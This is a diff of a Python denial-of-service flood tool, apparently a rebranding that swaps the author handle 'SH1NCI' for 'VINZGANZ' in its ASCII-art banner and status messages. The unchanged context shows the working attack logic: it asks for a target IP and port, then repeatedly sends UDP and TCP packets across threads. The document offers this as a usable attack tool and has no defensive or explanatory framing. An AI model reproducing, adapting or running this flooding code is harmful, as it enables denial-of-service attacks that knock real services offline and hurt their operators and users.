@@ -6,7 +6,7 @@ import os
 import sys
 
 os.system("clear")
-print(" ToolDdosBySh1nci ")
+print(" ToolDdosByVinzGanz ")
 print(" ⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄ ")
 print(" ⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄")
 print(" ⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄")
@@ -42,7 +42,7 @@ print("⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿")
 print("⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿")
 print("⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿")
 print("⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⡻⣝⣮⣟⡻⣝⣿")
-print("SH1NCI NIH SENGGOL DONG")
+print("VINZGANZ NIH SENGGOL DONG")
 
 ip = str(input(" IP TARGET:"))
 port = int(input(" PORT TARGET:"))
@@ -58,7 +58,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PERMISI PACKET FORM SH1NCI !!!")
+			print(i +" PERMISI PACKET FORM VINZGANZ !!!")
 		except:
 			print("[!] SH1NCI NOT DAMAGE!!!")
 
@@ -72,10 +72,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PERMISI PACKET FROM SH1NCI!!!")
+			print(i +" PERMISI PACKET FROM VINZGANZ!!!")
 		except:
 			s.close()
-			print("[*] SH1NCI NOT DAMAGE!!!")
+			print("[*] VINZGANZ NOT DAMAGE!!!")
             
 for y in range(threads):
 	if choice == 'y':
